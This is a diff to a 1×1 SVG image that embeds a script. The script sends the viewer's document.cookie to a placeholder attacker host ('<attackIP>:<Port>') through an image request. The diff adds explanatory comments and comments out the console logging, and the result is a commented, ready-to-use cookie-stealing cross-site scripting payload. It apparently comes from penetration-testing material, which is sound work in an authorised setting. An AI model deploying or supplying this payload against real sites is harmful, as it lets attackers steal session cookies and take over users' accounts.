@@ -1,12 +1,21 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
 <svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
+    <!-- Defines a rectangle shape in the SVG. It's positioned at (1,1) and has a width and height of 1 unit. -->
     <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />
+
+    <!-- Embedded script within the SVG -->
     <script type="text/ecmascript">
         <![CDATA[
-        console.log("Before request: ", document.cookie);
-        new Image().src = 'http://<attackIP>/index.php?c=' + document.cookie;
-        console.log("After request");
+        // Logs the current document's cookies to the console (uncomment for using in testing env)
+        // console.log("Before request: ", document.cookie);
+
+        // Creates a new Image object and sets its source.
+        // This sends a GET request to the specified URL with the document's cookies as a query parameter.
+        new Image().src = 'http://<attackIP>:<Port>/index.php?c=' + document.cookie;
+
+        // Logs a message to the console after making the request (uncomment for using in testing env)
+        // console.log("After request");
         ]]>
     </script>
 </svg>
